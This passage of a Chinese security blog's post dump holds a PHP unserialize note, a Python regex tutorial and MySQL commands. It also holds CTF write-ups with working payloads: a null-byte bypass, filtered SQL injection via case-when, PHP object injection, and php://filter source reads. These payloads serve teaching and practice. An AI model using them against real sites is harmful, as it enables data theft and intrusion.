&apos;O:4:&quot;haha&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;&#125;&apos;;var_dump(unserialize($user_ser));echo &quot;&lt;br&gt;&quot;;haha这个类是没有定义的 但是还能正常输出 没有报错 输出结果为：object(__PHP_Incomplete_Class)#3 (3) &#123; [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(4) &quot;haha&quot; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; &#125; 有两种方案进行修复 定义__autoload()等函数，指定发现未定义类时加载类的定义文件 可通过 php.ini、ini_set() 或 .htaccess 定义unserialize_callback_func。每次实例化一个未定义类时它都会被调用 1234567891011121314// unserialize_callback_func 从 PHP 4.2.0 起可用ini_set(&apos;unserialize_callback_func&apos;, &apos;mycallback&apos;); // 设置您的回调函数function mycallback($classname) &#123; // 只需包含含有类定义的文件 // $classname 指出需要的是哪一个类&#125;// 建议使用下面的函数，代替__autoload()spl_autoload_register(function ($class_name) &#123; // 动态加载未定义类的定义文件 require_once $class_name . &apos;.php&apos;;&#125;); 附上参考链接 http://uusama.com/663.html","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"nnctf writeup","slug":"nnctf-writeup","date":"2018-12-08T15:14:44.000Z","updated":"2019-05-08T15:35:11.925Z","comments":true,"path":"2018/12/08/nnctf-writeup/","link":"","permalink":"http://yoursite.com/2018/12/08/nnctf-writeup/","excerpt":"","text":"南宁nnctf web wp超简单打开发现给出了源码12345678910111213141516171819202122&lt;?php$white_list = range(0,9);require_once(&apos;flag.php&apos;);if(isset($_REQUEST[&apos;no&apos;]))&#123; $a=$_REQUEST[&apos;no&apos;]; if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123; echo &apos;no must be number&apos;; &#125;else&#123; if(in_array($a,$white_list))&#123; if(strlen($a)&gt;1)&#123; echo &apos;you are a great dark phper&lt;br&gt;&apos;; echo &quot;&lt;img src=&apos;dark.gif&apos;&gt;&lt;br&gt;&quot;; echo $flag; &#125;else&#123; echo &apos;you no dark&apos;; &#125; &#125;else&#123; echo &apos;you are so dark&apos;; &#125; &#125; &#125;else highlight_file(__FILE__); 代码分析： 传递了一个no参数 正则匹配 只能是数字 设置了白名单 长度大于一 playload:1?no=1%00 sql?这个是一个源码泄露但是因为工具的原名跑不出来源码 网上用大佬的工具跑出来了123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php$flag = &apos;gxnnctf&#123;***************************&#125;&apos;;require_once(&apos;config.php&apos;);$conn = new mysqli($db_servername,$db_username,$db_password,$db_name);if($conn-&gt;connect_error)&#123; die(&quot;Connect failed:&quot;.$conn-&gt;connect_error);&#125;if(isset($_GET[&apos;id&apos;]))&#123; $id = $_GET[&apos;id&apos;]; if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&apos;,$id)) die(&apos;Don\\&apos;t hurt me :-(&apos;); $sql = &quot;select username from user where id = &quot;.$id; $result = $conn-&gt;query($sql); if($result)&#123; $row = $result-&gt;fetch_array(); &#125;else&#123; echo mysqli_error($conn); die(); &#125; echo(&apos;hello &apos;.$row[&apos;username&apos;].&apos;&lt;br&gt;&apos;); $username = $row[&apos;username&apos;]; if($username === &apos;guest&apos;)&#123; $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]:$_SERVER[&apos;REMOTE_ADDR&apos;]; if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&apos;,$ip))&#123; die(&apos;Don\\&apos; hack me&apos;); &#125; if(!empty($ip))&#123; echo &apos;you from &apos;.$ip.&apos; , I remembered it.&lt;br&gt;&apos;; $conn-&gt;query(&quot;insert into logs(ip) values(&apos;$ip&apos;)&quot;); &#125; $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&apos;username&apos;]; if($username === &apos;admin&apos;)&#123; var_dump($_GET[&apos;backdoor&apos;]); if(isset($_GET[&apos;backdoor&apos;])&amp;&amp;$_GET[&apos;backdoor&apos;]===&apos;Melonrind&apos;)&#123; echo &apos;you find the backdoor!!!&lt;br&gt;&apos;; die($flag); &#125;else&#123; echo &quot;you are so great,but you don\\&apos;t have backdoor,so continue to challenge :(&quot;; &#125; &#125;else&#123; echo &quot;but i don\\&apos;t waiting for you &quot;; &#125; &#125;else&#123; echo &apos;emmmmm&apos;; &#125;&#125;else&#123; echo &apos;welcome to gxnnctf2018!&lt;br&gt;&apos;; echo &apos;i filtered everything,so have a good time :)&apos;;&#125; 分析代码：1234567891011121314151617181920$result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id);$row = $result-&gt;fetch_array();$username = $row[&apos;username&apos;];if($username === &apos;guest&apos;)&#123; $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]:$_SERVER[&apos;REMOTE_ADDR&apos;]; if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\\(|\\)|time|date|sec|day#is&apos;,$ip))&#123; die(&apos;Don\\&apos; hack me&apos;); &#125; if(!empty($ip))&#123; echo &apos;you from &apos;.$ip.&apos; , I remembered it.&lt;br&gt;&apos;; $conn-&gt;query(&quot;insert into logs(ip) values(&apos;$ip&apos;)&quot;); &#125; $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id); $row = $result-&gt;fetch_array(); $username = $row[&apos;username&apos;]; if($username === &apos;admin&apos;)&#123; var_dump($_GET[&apos;backdoor&apos;]); if(isset($_GET[&apos;backdoor&apos;])&amp;&amp;$_GET[&apos;backdoor&apos;]===&apos;Melonrind&apos;)&#123; echo &apos;you find the backdoor!!!&lt;br&gt;&apos;; die($flag); 这些能够得到flag 进行第一次的select语句 查询结果是2 也就是guest 才能进行下列的操作 然后进行第二次的查询语句 如果结果为1 也就是admin get传递参数backdoor === Melonrind 这样才能显示flag 发现这个过滤了好多东西 常用的注入都不能进行了 后来看别人的writeup 使用了 case when then end 的查询 类似这样能得到两个我们所需要的结果 但是因为过滤了空格 我们可以使用%20代替 于是构建playload:1?id=case%20when%20@a%20is%20null%20then%20@a:=2%20else%20@a:=@a-1%20end&amp;backdoor=Melonrind 这样就能得到flag web进入题目发现源代码：123456789101112131415161718192021222324252627282930313233&lt;?php//include(&quot;./class.php&quot;);header(&quot;content-type:text/html;charset=utf-8&quot;);error_reporting(0);if(isset($_GET[&quot;file&quot;]))&#123; $file = $_GET[&quot;file&quot;]; if(isset($_GET[&quot;password&quot;]))&#123; $password = $_GET[&quot;password&quot;]; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;不能现在就给你flag哦&quot;; exit(); &#125;else&#123; require_once($file); highlight_file(&quot;$file&quot;); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo &quot;需要密码的！&lt;br&gt;&quot;; &#125;&#125;else&#123; highlight_file(&apos;./index.php&apos;);&#125;if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;不能现在就给你flag哦&quot;; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password;&#125;?&gt; 可见是代码审计。 提示class.php故get传参file=class.php看到需要密码，继续传参password=1（任意值）发现class.php的源码： 12345678910111213&lt;!-- hello friend! --&gt;&lt;?php class Flag&#123;//flag_good.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&lt;br&gt;&quot;); &#125; &#125; &#125; ?&gt; 根据两个代码和提示flag_good.php，构造playload:1?file=class.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:13:&quot;flag_good.php&quot;;&#125; 得到flag： flag{132e9a8fcba14cbbaaad09c76d15bd07}","categories":[],"tags":[]},{"title":"python正则表达式","slug":"python正则表达式","date":"2018-11-08T16:36:18.000Z","updated":"2019-05-08T16:43:48.888Z","comments":true,"path":"2018/11/09/python正则表达式/","link":"","permalink":"http://yoursite.com/2018/11/09/python正则表达式/","excerpt":"Python正则表达式","text":"Python正则表达式 正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。 re 模块，它提供Perl风格的正则表达式模式。使 Python语言拥有全部的正则表达式功能。 compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 re模块re.match函数re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法： re.match(pattern,string,flags=0) 参数说明： pattern: 匹配正则表达式 strung：要匹配的字符 flags：标志位，用于控制正则表达式的匹配方式，如是否区分大小写，多行匹配等等 匹配成功re.match方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 group(num=0) 匹配的整个表达式的字符串，group()可以一次输入多个组号,在这种情况下它将返回一个包含那些组所对值得元组 groups() 返回一个包含所有小组字符串的元组，从1到所含的小组号 12345678910111213141516171819#!/usr/bin/pythonimport re line = &quot;Cats are smarter than dogs&quot; matchObj = re.match( r&apos;(.*) are (.*?) .*&apos;, line, re.M|re.I) if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2)else: print &quot;No match!!&quot;以上实例执行结果如下：matchObj.group() : Cats are smarter than dogsmatchObj.group(1) : CatsmatchObj.group(2) : smarter 正则表达式修饰符 - 可选标志 re.l 使匹配对大小写不敏感 re.L 做本地化识别(locale-aware)匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使.匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解 re.search方法re.search：扫描整个字符串并返回第一个成功的匹配。1234567891011121314151617181920212223242526272829303132#!/usr/bin/python# -*- coding: UTF-8 -*- import reprint(re.search(&apos;www&apos;, &apos;www.runoob.com&apos;).span()) # 在起始位置匹配print(re.search(&apos;com&apos;, &apos;www.runoob.com&apos;).span()) # 不在起始位置匹配以上实例运行输出结果为：(0, 3)(11, 14)#!/usr/bin/pythonimport re line = &quot;Cats are smarter than dogs&quot;; searchObj = re.search( r&apos;(.*) are (.*?) .*&apos;, line, re.M|re.I) if searchObj: print &quot;searchObj.group() : &quot;, searchObj.group() print &quot;searchObj.group(1) : &quot;, searchObj.group(1) print &quot;searchObj.group(2) : &quot;, searchObj.group(2)else: print &quot;Nothing found!!&quot;以上实例执行结果如下：searchObj.group() : Cats are smarter than dogssearchObj.group(1) : CatssearchObj.group(2) : smarter re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。1234567891011121314151617181920212223242526 #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot;; matchObj = re.match( r&apos;dogs&apos;, line, re.M|re.I) if matchObj: print &quot;match --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; matchObj = re.search( r&apos;dogs&apos;, line, re.M|re.I) if matchObj: print &quot;search --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; 以上实例运行结果如下： No match!! search --&gt; matchObj.group() : dogs``` ### 检索和替换Python 的re模块提供了re.sub用于替换字符串中的匹配项。语法： re.sub(pattern, repl, string, count=0, flags=0) 参数： pattern : 正则中的模式字符串。 repl : 替换的字符串，也可为一个函数。 string :要被查找替换的原始字符串。 count :模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 1例子： #!/usr/bin/python -- coding: UTF-8 -- import re phone = “2004-959-559 # 这是一个国外电话号码” 删除字符串中的 Python注释 num = re.sub(r’#.*$’, “”, phone) print “电话号码是: “, num 删除非数字(-)的字符串 num = re.sub(r’\\D’, “”, phone) print “电话号码是 : “, num 以上实例执行结果如下： 电话号码是: 2004-959-559 电话号码是 : 2004959559 1repl 参数是一个函数的情况 #!/usr/bin/python -- coding: UTF-8 -- import re def double(a): value = int(a.group(&apos;value&apos;)) print value return str(value * 2) s = ‘asas55da546sdsa15661’ print(re.sub(‘(?P\\d+)’, double, s)) 输出结果 55 546 15661 asas110da1092sdsa31322 [Finished in 0.1s] 123### re.compile()函数compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 re.compile(pattern[, flags]) 参数 pattern: 一个字符串的正则表达式 flags: 可选，表示匹配模式 re.l 忽略大小写 re.L 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境 re.M 多行模式 re.S 即为.并且包含换行符在内的任意符号（.不包括换行符） re.U 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库 re.X 为了增加可读性，忽略空格和 # 后面的注释 import re pattern = re.compile(r&apos;\\d+&apos;) m = pattern.match(&apos;one12twothree34four&apos;) # 查找头部，没有匹配 print m m = pattern.match(&apos;one12twothree34four&apos;, 2, 10) # 从&apos;e&apos;的位置开始匹配，没有匹配 print m m = pattern.match(&apos;one12twothree34four&apos;, 3, 10) # 从&apos;1&apos;的位置开始匹配，正好匹配 print m 三次输出的结果为： None None &lt;_sre.SRE_Match object at 0x0340E640&gt; # 可以看出当匹配成功时返回一个 Match 对象 # 这些可以接受对象的函数输出： print m.group(0) print m.start(0) print m.end(0) print m.span(0) #输出为： 12 3 5 (3, 5) 12345- group([group1,...])方法用于获得一个或多个分组匹配的字符串，当要获取整个匹配的子串时，可直接使用 group()或者group(0)；- start([group]) 方法用于获取分组匹配的子串在整个整个字符串中起始的位置(子串第一个字符的索引)，参考默认值为0；- end([group]) 方法用于获取分组匹配的子串在整个整个字符串中结束的位置(子串最后一个字符的索引+1)，参考默认值为0；- span([group]) 方法返回 (start(group), end(group))。 import re pattern = re.compile(r&apos;([a-z]+) ([a-z]+) ([a-z]+)&apos;, re.I) m = pattern.match(&apos;Hello World Wide Web&apos;) print m.groups() # 等价于 (m.group(1), m.group(2), ...) print m.span(1) # 返回第一个分组匹配成功的子串的索引 输出结果： (&apos;Hello&apos;, &apos;World&apos;, &apos;Wide&apos;) (0, 5) [Finished in 0.1s] 1234567891011121314151617181920212223242526272829### findall函数在字符串中找到正则表达式所匹配的所有子串，并返回到一个列表，如果没有找到匹配的，则返回空列表。注意：match和search是匹配一次findall匹配所有``` findall(string[, pos[, endpos]]) 参数- string 待匹配的字符串- pos 可选参数，指定字符串的起始位置，默认为0- endpos 可选参数，指定字符串的结束位置，默认为字符串的长度 import re findnumber = &apos;ahsd5asdj656asd645asd&apos; pattern = re.compile(r&apos;\\d+&apos;) m = pattern.findall(findnumber) n = pattern.findall(findnumber,0,10) print m print n 输出结果： [&apos;5&apos;, &apos;656&apos;, &apos;645&apos;] [&apos;5&apos;, &apos;6&apos;] [Finished in 0.1s] re.finditer和 findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。123456789101112131415161718192021 re.finditer(pattern, string, flags=0)实例 import re findnumber = &apos;ahsd5asdj656asd645asd&apos; p = re.finditer(r&apos;\\d+&apos;, findnumber) for a in p: print a.group() 输出为： 5 656 645 ``` ### re.splitsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： re.split(pattern, string[, maxsplit=0, flags=0]) 123456参数：- pattern 匹配的正则表达式- string 要匹配的字符串。- maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。- flags 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 b = re.split(‘(\\d+)’, ‘ asd, 541sad, asd5.5415’) print b 输出结果[‘ asd, ‘, ‘541’, ‘sad, asd’, ‘5’, ‘.’, ‘5415’, ‘’]` 正则表达式对象re.RegexObjectre.compile() 返回 RegexObject 对象。 re.MatchObjectgroup() 返回被 RE 匹配的字符串。 start() 返回匹配开始的位置 end() 返回匹配结束的位置 span() 返回一个元组包含匹配 (开始,结束) 的位置 正则表达式修饰符 re.I 使匹配对大小写不敏感 re.L 做本地化识别（locale-aware）匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使 . 匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 正则表达式模式 ^ 匹配字符串的开头 $ 匹配字符串的末尾。 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’ [^…] 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。 re* 匹配0个或多个的表达式。 re+ 匹配1个或多个的表达式。 re? 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式 re{ n} 精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。 re{ n,} 匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。 re{ n, m} 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式 a| b 匹配a或b (re) 匹配括号内的表达式，也表示一个组 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (…), 但是不表示一个组 (?imx: re) 在括号中使用i, m, 或 x 可选标志 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志 (?#…) 注释. (?= re) 前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 (?&gt; re) 匹配的独立模式，省去回溯。 \\w 匹配字母数字及下划线 \\W 匹配非字母数字及下划线 \\s 匹配任意空白字符，等价于 [\\t\\n\\r\\f]. \\S 匹配任意非空字符 \\d 匹配任意数字，等价于 [0-9]. \\D 匹配任意非数字 \\A 匹配字符串开始 \\Z 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 \\z 匹配字符串结束 \\G 匹配最后匹配完成的位置。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\n, \\t, 等. 匹配一个换行符。匹配一个制表符。等 \\1…\\9 匹配第n个分组的内容。 \\10 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"mysql 数据库的基本操作","slug":"mysql-数据库的基本操作","date":"2018-10-08T16:21:17.000Z","updated":"2019-05-08T16:22:54.883Z","comments":true,"path":"2018/10/09/mysql-数据库的基本操作/","link":"","permalink":"http://yoursite.com/2018/10/09/mysql-数据库的基本操作/","excerpt":"mysql 数据库的操作","text":"mysql 数据库的操作 一些常用的命令1.增加一个字段12alter table 表名字 add COLUMN 新列名 VARCHAR(20) DEFAULT NULL; //增加一个字段，默认为空alter table user add COLUMN new2 VARCHAR(20) NOT NULL; //增加一个字段，默认不能为空 2.删除一个字段1alter table 表名字 DROP COLUMN 要删除的列名; //除一个字段 3.修改一个字段123456789101112131415161718192021222324252627282930313233343536373839alter table user MODIFY new1 VARCHAR(10); //修改一个字段的类型alter table user CHANGE new1 new4 int; //修改一个字段的名称，此时一定要重新//主键alter table tabelname add new_field_id int(5) unsigned default 0 not null auto_increment ,add primary key (new_field_id);//增加一个新列alter table t2 add d timestamp;alter table infos add ex tinyint not null default ‘0′;//删除列alter table t2 drop column c;//重命名列alter table t1 change a b integer;//改变列的类型alter table t1 change b b bigint not null;alter table infos change list list tinyint not null default ‘0′;//重命名表 alter table t1 rename t2;加索引mysql&gt; alter table tablename change depno depno int(5) not null;mysql&gt; alter table tablename add index 索引名 (字段名1[，字段名2 …]);mysql&gt; alter table tablename add index emp_name (name);加主关键字的索引mysql&gt; alter table tablename add primary key(id);加唯一限制条件的索引mysql&gt; alter table tablename add unique emp_name2(cardnumber);删除某个索引mysql&gt;alter table tablename drop index emp_name;增加字段：mysql&gt; ALTER TABLE table_name ADD field_name field_type;修改原字段名称及类型：mysql&gt; ALTER TABLE table_name CHANGE old_field_name new_field_name field_type;删除字段：mysql&gt; ALTER TABLE table_name DROP field_name;mysql修改字段长度alter table 表名 modify column 字段名 类型;例如数据库中user表 name字段是varchar(30)可以用alter table user modify column name varchar(50) ; 数据库的操作12345678910111213141516171819202122232425262728293031net stop mysql //关闭msql net start mysql //开启mysqlmysql -uroot -proot //登陆mysqlshow databases； //查看数据库 use test //切换到test数据库show tables； //查看所有表select * from user； //查看表中数据desc user； //查看表结构exit； //退出mysql客户端create database user； //创建数据库use user； //切换数据库drop database user； //删除数据库创建表：create table user（id int，name varchar（30），pass varchar（30）); rename table user to user1; //修改表名drop table user1 //删除表insert into user(id) values(&quot; &quot;)select count(*) from user; 查询数据的总行数asc是表示升序，desc表示降序exit; 退出select database(); 查询现在所在的库的名字；select vresion()； 查询Mysql的版本信息；select User(); 查询使用者的权限；select @@datadir; 查询Mysql的存储位置；","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"文件泄露","slug":"文件泄露","date":"2018-09-08T06:13:02.000Z","updated":"2019-05-08T15:38:24.024Z","comments":true,"path":"2018/09/08/文件泄露/","link":"","permalink":"http://yoursite.com/2018/09/08/文件泄露/","excerpt":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的","text":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的 .git源码泄漏原因在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 .DS_Store文件泄漏原因.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。 .hg源码泄漏原因hg是类似于git的一种分布式管理，hg初始化的时候会生成hg文件， 编辑器临时文件泄露vim编辑器vim临时文件程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。 恢复文件：12前提是.index.php.swp存在于该目录下vim -r 恢复的文件名 vim备份文件默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；例如：index.php的备份文件则为index.php~ PHPSTORM使用phpstorm新建项目时，会生成一个.idea文件夹，这个文件夹有一个workspace.xml，访问可以得到一些信息。 网站源码备份文件泄露www.rar/nyist.tar.gz/web.zip等压缩文件名","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"bugku welcome to the bugkuctf wp","slug":"bugku-welcome-to-the-bugkuctf-wp","date":"2018-05-08T15:42:22.000Z","updated":"2019-05-08T16:24:24.305Z","comments":true,"path":"2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","link":"","permalink":"http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","excerpt":"welcome to the bugkuctf","text":"welcome to the bugkuctf 点击连接 之后查看源码 发现 you are not the number of bugku ! &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; 发现了需要get传递三个参数 $_GET[‘txt’] === $user === “welcome to the bugkuctf” $file = hint.php 就想到了 php伪协议 文件包含漏洞 GET /test1/index.php? txt=php://input &amp;file=php://filter/read=convert.base64-encode/resource=hint.php &amp;password= POST welcome to the bugkuctf 可以读出来 hint.php &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } ?&gt; 同理 也可以读出index.php的代码 &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;?????????????????????flag???&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo &quot;you are not the number of bugku ! &quot;; } ?&gt; &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; hint.php 提示的flag.php 从index.php可以看到对关键词flag进行了preg_match 所以不能直接读出代码内容 hint.php 定义的是一个类 注意到中间有一个__tostring方法， 这个函数就是把类当作字符串执行时会自动执行的一个函数。 __tostring 方法执行时，将变量$file作为文件名输出文件内容，结合提示flag.php，猜测屏蔽的flag.php文件在此打开 将hint.php中的Flag方法当做字符串执行时，会自动执行__tostring方法，只有echo，只能输出一个或多个字符串，所以构造password为Flag类型，其中的string变量flie=flag.php即可 看到了代码中有 include($file); $password = unserialize($password); echo $password; 因此知道需要构造序列化对象payload为 GET /test1/index.php?txt=php://input &amp;file=hint.php &amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} POST welcome to the bugkuctf 就可得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]}]}